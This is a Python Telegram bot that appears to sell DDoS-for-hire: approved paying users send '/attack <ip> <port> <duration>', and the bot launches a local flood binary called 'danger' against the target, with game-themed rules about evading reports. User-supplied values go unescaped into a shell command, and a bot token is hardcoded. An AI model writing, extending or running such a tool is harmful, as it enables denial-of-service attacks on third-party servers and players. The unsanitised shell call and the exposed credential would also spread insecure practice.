import logging
import asyncio
import os
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

# Set the token and admin user ID directly
TELEGRAM_BOT_TOKEN = '7656897396:AAELxhZuM9_zYvhTMFrLwMjlTZ70T2zmdK0'  # Replace with your actual token
ADMIN_USER_ID = '7530806675'  # Replace with your actual admin user ID
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
USERS_FILE = os.path.join(BASE_DIR, 'users.txt')
DANGER_SCRIPT = os.path.join(BASE_DIR, 'danger')
attack_in_progress = False

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.DEBUG  # Set to DEBUG for detailed logs
)
logger = logging.getLogger(__name__)

def load_users():
    try:
        with open(USERS_FILE, 'r') as f:
            users = set(line.strip() for line in f if line.strip())  # Ignore empty lines
            logger.info(f"Loaded {len(users)} users: {users}")  # Log the loaded user IDs
            return users
    except FileNotFoundError:
        logger.warning(f"{USERS_FILE} not found. Starting with an empty user list.")
        return set()
    except Exception as e:
        logger.error(f"An error occurred while loading users: {e}")
        return set()

def save_users(users):
    try:
        with open(USERS_FILE, 'w') as f:
            f.writelines(f"{user}\n" for user in users)
        logger.info(f"Saved {len(users)} users.")
    except Exception as e:
        logger.error(f"Failed to save users: {e}")

users = load_users()

# Define your bot commands here
async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "Welcome to the Paid Service\n"
        "This is a Single Attack. If you already have access, then *Use /attack <ip> <port> <duration>*\n"
        "Or Buy from Owner. Plan purchase available from the one and only @VIPXDDOS_ADMIN"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
    logger.debug(f"Sent start message to chat_id {chat_id}.")

async def help_command(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "Bot Rules - Keep It Cool!\n\n"
        "1. No spamming attacks! ⛔\n"
        "   Rest for 5-6 matches between DDOS.\n\n"
        "2. Limit your kills! 🔫\n"
        "   Stay under 30-40 kills to keep it fair.\n\n"
        "3. Play smart! 🎮\n"
        "   Avoid reports and stay low-key.\n\n"
        "4. No mods allowed! 🚫\n"
        "   Using hacked files will get you banned.\n\n"
        "5. Be respectful! 🤝\n"
        "   Keep communication friendly and fun.\n\n"
        "6. Report issues! 🛡️\n"
        "   Message the owner for any problems.\n\n"
        "💡 Follow the rules and let’s enjoy gaming together!"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
    logger.debug(f"Sent help message to chat_id {chat_id}.")

async def manage(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=chat_id, 
            text="*If you want access, contact your owner and admin.\nDon't overload our servers!*", 
            parse_mode='Markdown'
        )
        logger.warning(f"Unauthorized manage command attempt by chat_id {chat_id}.")
        return

    if len(args) != 2:
        await context.bot.send_message(
            chat_id=chat_id, 
            text="*⚠️ Usage: /manage <add|rem> <user_id>*", 
            parse_mode='Markdown'
        )
        logger.warning(f"Incorrect manage command usage by chat_id {chat_id}. Args: {args}")
        return

    command, target_user_id = args
    target_user_id = target_user_id.strip()

    if command == 'add':
        users.add(target_user_id)
        save_users(users)
        await context.bot.send_message(
            chat_id=chat_id, 
            text=f"*✔️ User {target_user_id} added.*", 
            parse_mode='Markdown'
        )
        logger.info(f"Added user {target_user_id} by admin {chat_id}.")
    elif command == 'rem':
        users.discard(target_user_id)
        save_users(users)
        await context.bot.send_message(
            chat_id=chat_id, 
            text=f"*✔️ User {target_user_id} removed.*", 
            parse_mode='Markdown'
        )
        logger.info(f"Removed user {target_user_id} by admin {chat_id}.")
    else:
        await context.bot.send_message(
            chat_id=chat_id, 
            text="*⚠️ Invalid command. Use 'add' or 'rem'.*", 
            parse_mode='Markdown'
        )
        logger.warning(f"Invalid manage command '{command}' by chat_id {chat_id}.")

async def run_attack(chat_id, ip, port, duration, context):
    global attack_in_progress
    attack_in_progress = True
    logger.info(f"Attack initiated by chat_id {chat_id} on {ip}:{port} for {duration} seconds.")

    try:
        # Ensure the danger script exists
        if not os.path.isfile(DANGER_SCRIPT):
            raise FileNotFoundError(f"Danger script not found at {DANGER_SCRIPT}")

        process = await asyncio.create_subprocess_shell(
            f'"{DANGER_SCRIPT}" {ip} {port} {duration} 10',
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            logger.debug(f"[stdout]\n{stdout.decode()}")
        if stderr:
            logger.error(f"[stderr]\n{stderr.decode()}")

    except FileNotFoundError as fnf_error:
        logger.error(f"FileNotFoundError: {fnf_error}")
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error: {str(fnf_error)}*", parse_mode='Markdown')
    except Exception as e:
        logger.exception("An unexpected error occurred during the attack.")
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')
    finally:
        attack_in_progress = False
        logger.info("Attack completed.")
        await context.bot.send_message(
            chat_id=chat_id, 
            text=(
                "*✅ Attack Completed! ✅*\n"
                "*Thank you for using our service!*\n"
                "*If you don't provide feedback, your service will be disconnected forever.*"
            ), 
            parse_mode='Markdown'
        )

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress

    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if user_id not in users:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need to be approved to use this bot.*", parse_mode='Markdown')
        logger.warning(f"Unauthorized attack attempt by user_id {user_id} in chat_id {chat_id}.")
        return

    if attack_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Another attack is already in progress. Please wait.*", parse_mode='Markdown')
        logger.warning(f"Attack already in progress. User {user_id} in chat_id {chat_id} attempted another attack.")
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        logger.warning(f"Incorrect attack command usage by user_id {user_id} in chat_id {chat_id}. Args: {args}")
        return

    ip, port, duration = args
    await context.bot.send_message(chat_id=chat_id, text=(
        f"*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Mayhem initiated! Let the battlefield ignite! 💥*"
    ), parse_mode='Markdown')
    logger.info(f"Attack launched by user_id {user_id} in chat_id {chat_id} on {ip}:{port} for {duration} seconds.")

    # Start the attack in a separate task
    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

# Main function to set up the bot
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Registering the command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("manage", manage))
    application.add_handler(CommandHandler("attack", attack))

    # Start the bot
    application.run_polling()

if __name__ == '__main__':
    main()